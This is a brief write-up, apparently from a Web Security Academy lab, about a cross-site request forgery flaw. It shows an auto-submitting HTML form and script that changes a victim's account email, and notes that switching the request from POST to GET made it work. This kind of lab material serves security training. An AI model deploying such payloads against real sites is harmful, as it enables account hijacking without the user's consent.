# CSRF Vulnerability


![****](/CSRF/Screenshots/csrf2.PNG)

## Let generate some Payloads!

```php
<form method="GET" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>
```

## Takeaway

- We change the request method from Post to **Get** and it worked!